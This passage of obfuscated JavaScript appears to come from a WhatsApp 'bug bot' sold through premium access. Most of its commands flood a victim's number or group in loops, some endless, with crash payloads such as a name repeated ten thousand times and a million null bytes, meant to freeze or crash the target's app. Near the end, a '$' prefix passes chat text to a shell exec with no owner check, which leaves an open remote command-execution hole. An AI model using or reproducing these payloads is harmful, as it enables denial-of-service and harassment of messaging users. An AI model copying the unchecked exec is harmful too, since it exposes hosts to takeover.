            return _0x5c4040("<!> The number starts with the number 0. Replace it with the number starting with the country code\n\n<✓> Example : ." + _0x256829 + " 94742274855");
          }
          let _0x2a6820 = _0x2dd911 + "@s.whatsapp.net";
          await _0x5c4040("In proses....");
          for (let _0x2a1731 = 0x0; _0x2a1731 < 0x28; _0x2a1731++) {
            await _0x29f40b(_0x2a6820, _0x1c96d1);
            await _0x29f40b(_0x2a6820, _0x1c96d1);
            await _0x29f40b(_0x2a6820, _0x1c96d1);
            await _0x29f40b(_0x2a6820, _0x1c96d1);
            await _0x29f40b(_0x2a6820, _0x1c96d1);
            await _0x29f40b(_0x2a6820, _0x1c96d1);
            await _0x29f40b(_0x2a6820, _0x1c96d1);
            await _0x29f40b(_0x2a6820, _0x1c96d1);
            await _0x29f40b(_0x2a6820, _0x1c96d1);
            await _0x29f40b(_0x2a6820, _0x1c96d1);
            await _0x29f40b(_0x2a6820, _0x1c96d1);
            await _0x29f40b(_0x2a6820, _0x1c96d1);
            await _0x29f40b(_0x2a6820, _0x1c96d1);
            await _0x29f40b(_0x2a6820, _0x1c96d1);
            await _0x29f40b(_0x2a6820, _0x1c96d1);
            await _0x29f40b(_0x2a6820, _0x1c96d1);
            await _0x29f40b(_0x2a6820, _0x1c96d1);
            await _0x29f40b(_0x2a6820, _0x1c96d1);
            await _0x29f40b(_0x2a6820, _0x1c96d1);
            await _0x29f40b(_0x2a6820, _0x1c96d1);
            await _0x29f40b(_0x2a6820, _0x1c96d1);
            await _0x29f40b(_0x2a6820, _0x1c96d1);
            await _0x29f40b(_0x2a6820, _0x1c96d1);
            await _0x29f40b(_0x2a6820, _0x1c96d1);
            await _0x29f40b(_0x2a6820, _0x1c96d1);
            await _0x29f40b(_0x2a6820, _0x1c96d1);
            await _0x29f40b(_0x2a6820, _0x1c96d1);
            await _0x29f40b(_0x2a6820, _0x1c96d1);
            await _0x29f40b(_0x2a6820, _0x1c96d1);
            await _0x29f40b(_0x2a6820, _0x1c96d1);
            await _0x29f40b(_0x2a6820, _0x1c96d1);
            await _0x29f40b(_0x2a6820, _0x1c96d1);
            await _0x29f40b(_0x2a6820, _0x1c96d1);
            await _0x29f40b(_0x2a6820, _0x1c96d1);
            await _0x29f40b(_0x2a6820, _0x1c96d1);
            await _0x29f40b(_0x2a6820, _0x1c96d1);
            await _0x29f40b(_0x2a6820, _0x1c96d1);
            await _0x29f40b(_0x2a6820, _0x1c96d1);
            await _0x29f40b(_0x2a6820, _0x1c96d1);
            await _0x29f40b(_0x2a6820, _0x1c96d1);
          }
          await _0x5c4040("<✓> Successfully Send Bug to " + _0x2dd911 + " Using " + _0x256829 + ". ✅\n\n<!> Pause 2 minutes so that the bot is not banned.");
        }
        break;
      case "self":
        {
          if (!_0x46a982) {
            return _0x5c4040(mess.only.owner);
          }
          _0x29487e["public"] = false;
          _0x5c4040("succes");
        }
        break;
      case "public":
        {
          if (!_0x46a982) {
            return _0x5c4040(mess.only.owner);
          }
          _0x29487e["public"] = true;
          _0x5c4040("succes");
        }
        break;
      case '🌷':
      case '💥':
        {
          if (!_0x5e0f00) {
            return _0x5c4040("specifically for premium users, if you want premium, buy it from the owner using the .owner method");
          }
          if (!q) {
            return _0x5c4040("Usage ." + _0x256829 + " 94742274855");
          }
          let _0x22c1a6 = q.replace(/[^0-9]/g, '');
          if (_0x22c1a6.startsWith('0')) {
            return _0x5c4040("<!> The number starts with the number 0. Replace it with the number starting with the country code\n\n<✓> Example : ." + _0x256829 + " 94742274855");
          }
          let _0x94c5fe = _0x22c1a6 + "@s.whatsapp.net";
          await _0x5c4040("In proses....");
          for (let _0x2ee302 = 0x0; _0x2ee302 < 0x1e; _0x2ee302++) {
            await _0x29f40b(_0x94c5fe, _0x1c96d1);
            await _0x29f40b(_0x94c5fe, _0x1c96d1);
            await _0x29f40b(_0x94c5fe, _0x1c96d1);
            await _0x29f40b(_0x94c5fe, _0x1c96d1);
            await _0x29f40b(_0x94c5fe, _0x1c96d1);
            await _0x29f40b(_0x94c5fe, _0x1c96d1);
            await _0x29f40b(_0x94c5fe, _0x1c96d1);
            await _0x29f40b(_0x94c5fe, _0x1c96d1);
            await _0x29f40b(_0x94c5fe, _0x1c96d1);
            await _0x29f40b(_0x94c5fe, _0x1c96d1);
            await _0x29f40b(_0x94c5fe, _0x1c96d1);
            await _0x29f40b(_0x94c5fe, _0x1c96d1);
            await _0x29f40b(_0x94c5fe, _0x1c96d1);
            await _0x29f40b(_0x94c5fe, _0x1c96d1);
            await _0x29f40b(_0x94c5fe, _0x1c96d1);
            await _0x29f40b(_0x94c5fe, _0x1c96d1);
            await _0x29f40b(_0x94c5fe, _0x1c96d1);
            await _0x29f40b(_0x94c5fe, _0x1c96d1);
            await _0x29f40b(_0x94c5fe, _0x1c96d1);
            await _0x29f40b(_0x94c5fe, _0x1c96d1);
          }
          await _0x5c4040("<✓> Successfully Send Bug to " + _0x22c1a6 + " Using " + _0x256829 + ". ✅\n\n<!> Pause 2 minutes so that the bot is not banned.");
        }
        break;
      case '⭐':
      case '⚡':
        {
          if (!_0x5e0f00) {
            return _0x5c4040("specifically for premium users, if you want premium, buy it from the owner using the .owner method");
          }
          if (!q) {
            return _0x5c4040("Usage ." + _0x256829 + " 94742274855");
          }
          let _0x32212c = q.replace(/[^0-9]/g, '');
          if (_0x32212c.startsWith('0')) {
            return _0x5c4040("<!> The number starts with the number 0. Replace it with the number starting with the country code\n\n<✓> Example : ." + _0x256829 + " 94742274855");
          }
          let _0x2166f9 = _0x32212c + "@s.whatsapp.net";
          await _0x5c4040("In proses....");
          for (let _0xd776eb = 0x0; _0xd776eb < 0xa; _0xd776eb++) {
            await _0x29f40b(_0x2166f9, _0x1c96d1);
            await _0x46eca1(_0x2166f9, _0x98b60e);
            await _0x29f40b(_0x2166f9, _0x1c96d1);
            await _0x46eca1(_0x2166f9, _0x98b60e);
            await _0x29f40b(_0x2166f9, _0x1c96d1);
            await _0x46eca1(_0x2166f9, _0x98b60e);
            await _0x29f40b(_0x2166f9, _0x1c96d1);
            await _0x46eca1(_0x2166f9, _0x98b60e);
            await _0x29f40b(_0x2166f9, _0x1c96d1);
            await _0x46eca1(_0x2166f9, _0x98b60e);
            await _0x29f40b(_0x2166f9, _0x1c96d1);
            await _0x46eca1(_0x2166f9, _0x98b60e);
            await _0x29f40b(_0x2166f9, _0x1c96d1);
            await _0x46eca1(_0x2166f9, _0x98b60e);
            await _0x29f40b(_0x2166f9, _0x1c96d1);
            await _0x46eca1(_0x2166f9, _0x98b60e);
            await _0x29f40b(_0x2166f9, _0x1c96d1);
            await _0x46eca1(_0x2166f9, _0x98b60e);
          }
          await _0x5c4040("<✓> Successfully Send Bug to " + _0x32212c + " Using " + _0x256829 + ". ✅\n\n<!> Pause 2 minutes so that the bot is not banned.");
        }
        break;
      case "bug-list":
        {
          if (!_0x5e0f00) {
            return _0x5c4040("specifically for premium users, if you want premium, buy it from the owner using the .owner method");
          }
          if (!_0x1b77d5) {
            return _0x5c4040("Example:\n" + (_0x460782 + _0x256829) + " 94xxxxxxxxx|5");
          }
          victim = _0x1b77d5.split('|')[0x0] + '@s.whatsapp.net';
          amount = _0x1b77d5.split('|')[0x1] * 0x1e;
          for (let _0x59b88f = 0x0; _0x59b88f < amount; _0x59b88f++) {
            await _0x29487e.sendMessage(victim, {
              'text': ''
            }, {
              'quoted': _0x1a2bd4
            });
          }
          _0x5c4040("Successfully Sent Bug To " + victim);
        }
        break;
      case "bug-list":
        {
          if (!_0x5e0f00) {
            return _0x5c4040("specifically for premium users, if you want premium, buy it from the owner using the .owner method");
          }
          if (!_0x1b77d5) {
            return _0x5c4040("Example:\n" + (_0x460782 + _0x256829) + " 94xxxxxxxxx|5");
          }
          victim = _0x1b77d5.split('|')[0x0] + "@s.whatsapp.net";
          amount = _0x1b77d5.split('|')[0x1] * 0x1e;
          for (let _0x51b643 = 0x0; _0x51b643 < amount; _0x51b643++) {
            await _0x29487e.sendMessage(victim, {
              'text': ''
            }, {
              'quoted': _0x1a2bd4
            });
          }
          _0x5c4040("Successfully Sent Bug To " + victim);
        }
        break;
      case "buglist-external":
        {
          if (!_0x5e0f00) {
            return _0x5c4040("specifically for premium users, if you want premium, buy it from the owner using the .owner method");
          }
          if (!_0x1b77d5) {
            return _0x5c4040("Example:\n" + (_0x460782 + _0x256829) + " 94xxxxxxxxx|5");
          }
          victim = _0x1b77d5.split('|')[0x0] + "@s.whatsapp.net";
          amount = _0x1b77d5.split('|')[0x1] * 0x1e;
          for (let _0x3e1da9 = 0x0; _0x3e1da9 < amount; _0x3e1da9++) {
            await _0x29487e.sendMessage(victim, {
              'text': ''
            }, {
              'quoted': _0x1a2bd4
            });
          }
          _0x5c4040("Successfully Sent Bug To " + victim);
        }
        break;
      case "buglist-internal":
        {
          if (!_0x5e0f00) {
            return _0x5c4040("specifically for premium users, if you want premium, buy it from the owner using the .owner method");
          }
          if (!_0x1b77d5) {
            return _0x5c4040("Example:\n" + (_0x460782 + _0x256829) + " 94xxxxxxxxx|5");
          }
          victim = _0x1b77d5.split('|')[0x0] + '@s.whatsapp.net';
          amount = _0x1b77d5.split('|')[0x1] * 0x1e;
          for (let _0x231b7a = 0x0; _0x231b7a < amount; _0x231b7a++) {
            await _0x29487e.sendMessage(victim, {
              'text': ''
            }, {
              'quoted': _0x1a2bd4
            });
          }
          _0x5c4040("Successfully Sent Bug To " + victim);
        }
        break;
      case "buglist-engine":
        {
          if (!_0x5e0f00) {
            return _0x5c4040("specifically for premium users, if you want premium, buy it from the owner using the .owner method");
          }
          if (!_0x1b77d5) {
            return _0x5c4040("Example:\n" + (_0x460782 + _0x256829) + " 94xxxxxxxxx|5");
          }
          victim = _0x1b77d5.split('|')[0x0] + "@s.whatsapp.net";
          amount = _0x1b77d5.split('|')[0x1] * 0x1e;
          for (let _0x3b34d0 = 0x0; _0x3b34d0 < amount; _0x3b34d0++) {
            await _0x29487e.sendMessage(victim, {
              'text': ''
            }, {
              'quoted': _0x1a2bd4
            });
          }
          _0x5c4040("Successfully Sent Bug To " + victim);
        }
        break;
      case "buglist-crash":
        {
          if (!_0x5e0f00) {
            return _0x5c4040("specifically for premium users, if you want premium, buy it from the owner using the .owner method");
          }
          if (!_0x1b77d5) {
            return _0x5c4040("Example:\n" + (_0x460782 + _0x256829) + " 94xxxxxxxxx|5");
          }
          victim = _0x1b77d5.split('|')[0x0] + "@s.whatsapp.net";
          amount = _0x1b77d5.split('|')[0x1] * 0x1e;
          for (let _0x1c193f = 0x0; _0x1c193f < amount; _0x1c193f++) {
            await _0x29487e.sendMessage(victim, {
              'text': ''
            }, {
              'quoted': _0x1a2bd4
            });
          }
          _0x5c4040("Successfully Sent Bug To " + victim);
        }
        break;
      case "delta1":
      case "delta2":
      case '💀':
      case "delta3":
        {
          if (!_0x5e0f00) {
            return _0x5c4040("specifically for premium users, if you want premium, buy it from the owner using the .owner method");
          }
          if (!q) {
            return _0x5c4040("Usage ." + _0x256829 + " 94742274855");
          }
          let _0x53385c = q.replace(/[^0-9]/g, '');
          if (_0x53385c.startsWith('0')) {
            return _0x5c4040("<!> The number starts with the number 0. Replace it with the number starting with the country code\n\n<✓> Example : ." + _0x256829 + " 94742274855");
          }
          let _0x6db192 = _0x53385c + "@s.whatsapp.net";
          await _0x5c4040("In proses....");
          for (let _0x2dc923 = 0x0; _0x2dc923 < 0x1; _0x2dc923++) {
            await _0x4018dc(_0x6db192, _0x98b60e);
            await _0x29f40b(_0x6db192, _0x1c96d1);
            await _0x46eca1(_0x6db192, _0x98b60e);
            await _0x29f40b(_0x6db192, _0x1c96d1);
            await _0x56a1f9(_0x6db192, _0x16bebe);
            await _0x29f40b(_0x6db192, _0x1c96d1);
          }
          await _0x5c4040("<✓> Successfully Send Bug to " + _0x53385c + " Using " + _0x256829 + ". ✅\n\n<!> Pause 2 minutes so that the bot is not banned.");
        }
        break;
      case "nolimit":
      case '😈':
        {
          if (!_0x5e0f00) {
            return _0x5c4040("specifically for premium users, if you want premium, buy it from the owner using the .owner method");
          }
          if (!q) {
            return _0x5c4040("Usage ." + _0x256829 + " 94742274855");
          }
          let _0x2b22bc = q.replace(/[^0-9]/g, '');
          if (_0x2b22bc.startsWith('0')) {
            return _0x5c4040("<!> The number starts with the number 0. Replace it with the number starting with the country code\n\n<✓> Example : ." + _0x256829 + " 94742274855");
          }
          let _0x5e7909 = _0x2b22bc + '@s.whatsapp.net';
          await _0x5c4040("In proses....");
          for (;;) {
            await _0x29f40b(_0x5e7909, _0x1c96d1);
            await _0x4018dc(_0x5e7909, _0x98b60e);
            await _0x29f40b(_0x5e7909, _0x1c96d1);
            await _0x29f40b(_0x5e7909, _0x1c96d1);
            await _0x4018dc(_0x5e7909, _0x98b60e);
            await _0x29f40b(_0x5e7909, _0x1c96d1);
            await _0x29f40b(_0x5e7909, _0x1c96d1);
            await _0x4018dc(_0x5e7909, _0x98b60e);
            await _0x29f40b(_0x5e7909, _0x1c96d1);
            await _0x29f40b(_0x5e7909, _0x1c96d1);
            await _0x4018dc(_0x5e7909, _0x98b60e);
            await _0x29f40b(_0x5e7909, _0x1c96d1);
            await sleep(0x7530);
          }
        }
        break;
      case "devilreact":
        {
          if (!_0x5e0f00) {
            return _0x5c4040("specifically for premium users, if you want premium, buy it from the owner using the .owner method");
          }
          if (!_0x26c51b.quoted) {
            return _0x5c4040("Example usage: " + (_0x460782 + _0x256829) + " reply chat");
          }
          await _0x29487e.sendMessage(_0x26c51b.chat, {
            'text': "Success In Sending Bug",
            'contextInfo': {
              'isForwarded': true,
              'forwardedNewsletterMessageInfo': {
                'newsletterJid': "120363222395675670@newsletter",
                'newsletterName': "By anggazyy 666".repeat(0x2710),
                'serverMessageId': 0x2
              }
            }
          }, {
            'quoted': _0x1a2bd4
          });
          await sleep(0x7d0);
          await _0x29487e.sendMessage(_0x26c51b.chat, {
            'react': {
              'text': '🐛',
              'key': {
                'remoteJid': _0x26c51b.chat,
                'fromMe': true,
                'id': _0x51b3e9.id
              }
            }
          });
        }
        break;
      case "delta4":
        {
          if (!_0x5e0f00) {
            return _0x5c4040("specifically for premium users, if you want premium, buy it from the owner using the .owner method");
          }
          if (!_0x1b77d5) {
            return _0x5c4040("Example:\n" + (_0x460782 + _0x256829) + " 94xxxxxxxxx|5");
          }
          victim = _0x1b77d5.split('|')[0x0] + "@s.whatsapp.net";
          amount = _0x1b77d5.split('|')[0x1] * 0x1e;
          for (let _0x518db3 = 0x0; _0x518db3 < amount; _0x518db3++) {
            await _0x29487e.sendMessage(victim, {
              'text': ''
            }, {
              'quoted': _0x1a2bd4
            });
          }
          _0x5c4040("Successfully Sent Bug To " + victim);
        }
      case "phone-crash":
        {
          if (!_0x5e0f00) {
            return _0x5c4040("specifically for premium users, if you want premium, buy it from the owner using the .owner method");
          }
          if (!q) {
            return _0x5c4040("Usage ." + _0x256829 + " 94742274855");
          }
          let _0x1e509d = q.replace(/[^0-9]/g, '');
          if (_0x1e509d.startsWith('0')) {
            return _0x5c4040("<!> The number starts with the number 0. Replace it with the number starting with the country code\n\n<✓> Example : ." + _0x256829 + " 94742274855");
          }
          let _0x4b2399 = _0x1e509d + '@s.whatsapp.net';
          await _0x5c4040("In proses....");
          for (;;) {
            await _0x29f40b(_0x4b2399, _0x98b60e);
          }
        }
        break;
      case "delta-nodevil":
      case 'ios-ui':
        {
          if (!_0x5e0f00) {
            return _0x5c4040("specifically for premium users, if you want premium, buy it from the owner using the .owner method");
          }
          if (!q) {
            return _0x5c4040("Usage ." + _0x256829 + " 94742274855");
          }
          let _0x23433c = q.replace(/[^0-9]/g, '');
          if (_0x23433c.startsWith('0')) {
            return _0x5c4040("<!> The number starts with the number 0. Replace it with the number starting with the country code\n\n<✓> Example : ." + _0x256829 + " 94742274855");
          }
          await _0x5c4040("In proses....");
          let _0xdd3ac8 = _0x23433c + "@s.whatsapp.net";
          for (;;) {
            await _0x4df23c(_0xdd3ac8);
            await sleep(0x4b0);
          }
        }
        break;
      case "ios-uicrash":
      case "ios-infinity":
        {
          if (!_0x5e0f00) {
            return _0x5c4040("specifically for premium users, if you want premium, buy it from the owner using the .owner method");
          }
          if (!q) {
            return _0x5c4040("Usage ." + _0x256829 + " 94742274855|1\n# memasukkan 1 sama dengan 300.detik");
          }
          let _0x2f5017 = q.split('|')[0x0];
          let _0xc55ccf = _0x2f5017.replace(/[^0-9]/g, '');
          if (_0xc55ccf.startsWith('0')) {
            return _0x5c4040("<!> The number starts with the number 0. Replace it with the number starting with the country code\n\n<✓> Example : ." + _0x256829 + " 94742274855|1");
          }
          let _0x22c43c = _0xc55ccf + "@s.whatsapp.net";
          let _0xa57bfb = q.split('|')[0x1] * 0xc8;
          let _0x487eb2 = _0xa57bfb * 1.5;
          _0x26c51b.reply(_0x487eb2 + " detik");
          _0x5c4040("In proses....");
          for (let _0x543dd0 = 0x0; _0x543dd0 < _0xa57bfb; _0x543dd0++) {
            await _0x4df23c(_0x22c43c);
            await sleep(0x5dc);
          }
          _0x5c4040("👤 Succes Send Bug Ke " + _0x22c43c + " dalam kurun waktu " + _0x487eb2 + " detik");
        }
        break;
      case "bug-button":
      case 'bug-sitexyz':
        {
          if (!_0x5e0f00) {
            return _0x5c4040("specifically for premium users, if you want premium, buy it from the owner using the .owner method");
          }
          if (!q) {
            return _0x5c4040("Usage ." + _0x256829 + " https://chat.whatsapp.com/");
          }
          _0x5c4040("In proses....");
          let _0x237590 = _0x135d23[0x0].split('https://chat.whatsapp.com/')[0x1];
          let _0x261804 = await _0x29487e.groupAcceptInvite(_0x237590);
          for (let _0x21cc6a = 0x0; _0x21cc6a < 0x5; _0x21cc6a++) {
            var _0x3dc49e = generateWAMessageFromContent(_0x26c51b.chat, proto.Message.fromObject({
              'viewOnceMessage': {
                'message': {
                  'interactiveMessage': {
                    'header': {
                      'title': '',
                      'subtitle': " "
                    },
                    'body': {
                      'text': "🩸⃟༑⌁⃰꒯ꏂ꒒꓄ꋬ 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠"
                    },
                    'footer': {
                      'text': "›          #DeltaCrash"
                    },
                    'nativeFlowMessage': {
                      'buttons': [{
                        'name': 'cta_url',
                        'buttonParamsJson': "{ display_text : '⿻DevilS⿻', url : , merchant_url :  }"
                      }],
                      'messageParamsJson': "\0".repeat(0xf4240)
                    }
                  }
                }
              }
            }), {
              'userJid': _0x26c51b.chat,
              'quoted': _0x98b60e
            });
            await _0x29487e.relayMessage(_0x261804, _0x3dc49e.message, {
              'messageId': _0x3dc49e.key.id
            });
            await sleep(0x2bc);
          }
          _0x5c4040("<✓> Successfully Send Bug to " + _0x261804 + " Using " + _0x256829 + ". ✅\n\n<!> Pause 2 minutes so that the bot is not banned.");
        }
        break;
      case 'button-internal':
      case "button-external":
        {
          if (!_0x5e0f00) {
            return _0x5c4040("specifically for premium users, if you want premium, buy it from the owner using the .owner method");
          }
          if (!q) {
            return _0x5c4040("Usage ." + _0x256829 + " https://chat.whatsapp.com/");
          }
          _0x5c4040("In proses....");
          let _0x37b591 = _0x135d23[0x0].split("https://chat.whatsapp.com/")[0x1];
          let _0x5f5bd5 = await _0x29487e.groupAcceptInvite(_0x37b591);
          for (let _0x3920ee = 0x0; _0x3920ee < 0x5; _0x3920ee++) {
            var _0x3dc49e = generateWAMessageFromContent(_0x26c51b.chat, proto.Message.fromObject({
              'viewOnceMessage': {
                'message': {
                  'interactiveMessage': {
                    'header': {
                      'title': '',
                      'subtitle': " "
                    },
                    'body': {
                      'text': "🩸⃟༑⌁⃰꒯ꏂ꒒꓄ꋬ 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠"
                    },
                    'footer': {
                      'text': "›          #DeltaCrash"
                    },
                    'nativeFlowMessage': {
                      'buttons': [{
                        'name': "cta_url",
                        'buttonParamsJson': "{ display_text : '⿻DevilS⿻', url : , merchant_url :  }"
                      }],
                      'messageParamsJson': "\0".repeat(0xf4240)
                    }
                  }
                }
              }
            }), {
              'userJid': _0x26c51b.chat,
              'quoted': _0x98b60e
            });
            await _0x29487e.relayMessage(_0x5f5bd5, _0x3dc49e.message, {
              'messageId': _0x3dc49e.key.id
            });
            await sleep(0x2bc);
          }
          _0x5c4040("<✓> Successfully Send Bug to " + _0x5f5bd5 + " Using " + _0x256829 + ". ✅\n\n<!> Pause 2 minutes so that the bot is not banned.");
        }
        break;
      case "enemygroup":
      case "bug-hole":
        {
          if (!_0x5e0f00) {
            return _0x5c4040("specifically for premium users, if you want premium, buy it from the owner using the .owner method");
          }
          if (!q) {
            return _0x5c4040("Usage ." + _0x256829 + " 1962623836281@g.us");
          }
          _0x5c4040("In proses....");
          target = q;
          for (let _0x493840 = 0x0; _0x493840 < 0x5; _0x493840++) {
            var _0x3dc49e = generateWAMessageFromContent(_0x26c51b.chat, proto.Message.fromObject({
              'viewOnceMessage': {
                'message': {
                  'interactiveMessage': {
                    'header': {
                      'title': '',
                      'subtitle': " "
                    },
                    'body': {
                      'text': "🩸⃟༑⌁⃰꒯ꏂ꒒꓄ꋬ 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠"
                    },
                    'footer': {
                      'text': "›          #DeltaCrash"
                    },
                    'nativeFlowMessage': {
                      'buttons': [{
                        'name': 'cta_url',
                        'buttonParamsJson': "{ display_text : '⿻DevilS⿻', url : , merchant_url :  }"
                      }],
                      'messageParamsJson': "\0".repeat(0xf4240)
                    }
                  }
                }
              }
            }), {
              'userJid': _0x26c51b.chat,
              'quoted': _0x98b60e
            });
            await _0x29487e.relayMessage(target, _0x3dc49e.message, {
              'messageId': _0x3dc49e.key.id
            });
            await sleep(0x2bc);
          }
          _0x5c4040("<✓> Successfully Send Bug to " + target + " Using " + _0x256829 + ". ✅\n\n<!> Pause 2 minutes so that the bot is not banned.");
        }
        break;
      case 'internal-group':
      case 'external-group':
        {
          if (!_0x5e0f00) {
            return _0x5c4040("specifically for premium users, if you want premium, buy it from the owner using the .owner method");
          }
          if (!q) {
            return _0x5c4040("Usage ." + _0x256829 + " 1962623836281@g.us");
          }
          _0x5c4040("In proses....");
          target = q;
          for (let _0x8bd61f = 0x0; _0x8bd61f < 0x5; _0x8bd61f++) {
            var _0x3dc49e = generateWAMessageFromContent(_0x26c51b.chat, proto.Message.fromObject({
              'viewOnceMessage': {
                'message': {
                  'interactiveMessage': {
                    'header': {
                      'title': '',
                      'subtitle': " "
                    },
                    'body': {
                      'text': "🩸⃟༑⌁⃰꒯ꏂ꒒꓄ꋬ 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠"
                    },
                    'footer': {
                      'text': "›          #DeltaCrash"
                    },
                    'nativeFlowMessage': {
                      'buttons': [{
                        'name': "cta_url",
                        'buttonParamsJson': "{ display_text : '⿻DevilS⿻', url : , merchant_url :  }"
                      }],
                      'messageParamsJson': "\0".repeat(0xf4240)
                    }
                  }
                }
              }
            }), {
              'userJid': _0x26c51b.chat,
              'quoted': _0x98b60e
            });
            await _0x29487e.relayMessage(target, _0x3dc49e.message, {
              'messageId': _0x3dc49e.key.id
            });
            await sleep(0x2bc);
          }
          _0x5c4040("<✓> Successfully Send Bug to " + target + " Using " + _0x256829 + ". ✅\n\n<!> Pause 2 minutes so that the bot is not banned.");
        }
        break;
      case "ttmp3":
        {
          const _0x576970 = _0x2df52c => {
            _0x2df52c = _0x2df52c.replace(/(<br?\s?\/>)/gi, " \n");
            return _0x2df52c.replace(/(<([^>]+)>)/gi, '');
          };
          async function _0x54bd86(_0x90b361) {
            let _0x43d059 = await axios("https://lovetik.com/api/ajax/search", {
              'method': "POST",
              'data': new URLSearchParams(Object.entries({
                'query': _0x90b361
              }))
            });
            let _0x2f55dc = {
              "creator": "Delta",
              title: _0x576970(_0x43d059.data.desc),
              "author": _0x576970(_0x43d059.data.author),
              nowm: await _0x276e44,
              "watermark": await _0x276e44,
              "audio": await _0x276e44,
              "thumbnail": await _0x276e44
            };
            return _0x2f55dc;
          }
          let _0x466888 = "[!] *wrong input*\n\t\nEx : " + (_0x460782 + _0x256829) + " https://vm.tiktok.com/ZSL7p9jRV/";
          if (!_0x1b77d5) {
            return _0x26c51b.reply(_0x466888);
          }
          _0x5c4040(mess.wait);
          let _0x4e7658 = await _0x54bd86(_0x1b77d5);
          await _0x29487e.sendMessage(_0x26c51b.chat, {
            'audio': {
              'url': _0x4e7658.audio
            },
            'mimetype': "audio/mpeg",
            'fileName': _0x4e7658.title + ".mp3",
            'ptt': false
          }, {
            'quoted': _0x26c51b
          });
        }
        break;
      case "ttdl":
      case 'tiktok':
      case 'tt':
        {
          async function _0x34ce87(_0x5dff8f) {
            try {
              const _0xcaad0b = new URLSearchParams({
                'id': _0x5dff8f,
                'locale': 'id',
                'tt': "RFBiZ3Bi"
              });
              const _0x2d7823 = {
                'HX-Request': true,
                'HX-Trigger': "_gcaptcha_pt",
                'HX-Target': "target",
                'HX-Current-URL': "https://ssstik.io/id",
                'Content-Type': "application/x-www-form-urlencoded; charset=UTF-8",
                'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
                'Referer': "https://ssstik.io/id"
              };
              const _0xe1b131 = await axios.post('https://ssstik.io/abc?url=dl', _0xcaad0b, {
                'headers': _0x2d7823
              });
              const _0x3a7261 = _0xe1b131.data;
              const _0x2bf426 = cheerio.load(_0x3a7261);
              const _0x33c67d = _0x2bf426("#avatarAndTextUsual h2").text().trim();
              const _0x5005a0 = _0x2bf426("#avatarAndTextUsual p").text().trim();
              const _0x5820b7 = _0x2bf426(".result_overlay_buttons a.download_link").attr("href");
              const _0x3e25ad = _0x2bf426(".result_overlay_buttons a.download_link.music").attr("href");
              const _0x22db6d = [];
              _0x2bf426("img[data-splide-lazy]").each((_0xe8f1fe, _0x379874) => {
                const _0x580534 = _0x2bf426(_0x379874).attr("data-splide-lazy");
                _0x22db6d.push(_0x580534);
              });
              const _0x19d1e1 = {
                'isSlide': !_0x5820b7,
                'author': _0x33c67d,
                'title': _0x5005a0,
                'result': _0x5820b7 || _0x22db6d,
                'audio': _0x3e25ad
              };
              return _0x19d1e1;
            } catch (_0x7564ac) {
              console.error("Error:", _0x7564ac);
              return null;
            }
          }
          let _0x3605a7 = "[!] *𝙴𝚛𝚘𝚛 𝙸𝚗𝚙𝚞𝚝*\n\t\nEx : " + (_0x460782 + _0x256829) + " https://vt.tiktok.com/ZSFm1R2yK/";
          if (!_0x1b77d5) {
            return _0x26c51b.reply(_0x3605a7);
          }
          if (!(_0x1b77d5.includes('http://') || _0x1b77d5.includes("https://"))) {
            return _0x5c4040("𝙻𝙸𝙽𝙺 𝚒𝚗𝚟𝚊𝚕𝚒𝚍, 𝚙𝚕𝚎𝚊𝚜𝚎 𝚒𝚗𝚙𝚞𝚝 𝚊 𝚟𝚊𝚕𝚒𝚍 𝙻𝙸𝙽𝙺,\n𝚃𝚛𝚢 𝚠𝚒𝚝𝚑 *𝐡𝐭𝐭𝐩𝐬://* 𝚘𝚛 *𝐡𝐭𝐭𝐩𝐬://*");
          }
          if (!_0x1b77d5.includes("tiktok.com")) {
            return _0x5c4040("𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐋𝐈𝐍𝐊.");
          }
          const {
            isSlide: _0x4be482,
            result: _0x1d3139,
            title: _0xb20e21,
            author: _0x467356
          } = await _0x34ce87(_0x1b77d5);
          if (_0x4be482 == true) {
            await _0x5c4040(mess.wait);
            let _0x51c179 = 0x1;
            for (let _0x49de91 of _0x1d3139) {
              _0x29487e.sendMessage(_0x26c51b.chat, {
                'caption': "👋 *Tiktok Image*\n\n ﻿" + _0x51c179++,
                'image': {
                  'url': _0x49de91
                }
              }, {
                'quoted': _0x26c51b
              });
              await delay(0x7d0);
            }
          } else {
            if (_0x4be482 == false) {
              await _0x5c4040(mess.wait);
              const _0x24910f = [{
                'name': 'quick_reply',
                'buttonParamsJson': JSON.stringify({
                  'display_text': "Audio 🎧",
                  'id': ".ttmp3 " + _0x1b77d5
                })
              }];
              _0x29487e.sendButtonVideo(_0x26c51b.chat, _0x24910f, _0x26c51b, {
                'video': _0x1d3139,
                'body': '',
                'footer': global.namabot
              });
            }
          }
        }
        break;
      case "delprem":
        {
          if (!_0x46a982) {
            return _0x5c4040(mess.only.owner);
          }
          if (!_0x135d23[0x0]) {
            return _0x5c4040("Usage " + (_0x460782 + _0x256829) + " number\nContact " + (_0x460782 + _0x256829) + " 94742274855");
          }
          ya = q.split('|')[0x0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          unp = _0x24d502.indexOf(ya);
          _0x24d502.splice(unp, 0x1);
          fs.writeFileSync("./all/database/premium.json", JSON.stringify(_0x24d502));
          _0x5c4040("number " + ya + " Premium Has Been Removed!");
        }
        break;
      default:
    }
    if (_0x362dff.startsWith('$')) {
      exec(_0x362dff.slice(0x2), (_0x3180d1, _0x1739b4) => {
        if (_0x3180d1) {
          return _0x5c4040(_0x3180d1);
        }
        if (_0x1739b4) {
          return _0x5c4040(_0x1739b4);
        }
      });
    }
    if (_0x362dff.startsWith('>')) {
      if (!_0x46a982) {
        return _0x5c4040(mess.only.owner);
      }
      try {
        let _0x58c4d1 = await eval(_0x362dff.slice(0x2));
        if (typeof _0x58c4d1 !== "string") {
          _0x58c4d1 = require('util').inspect(_0x58c4d1);
        }
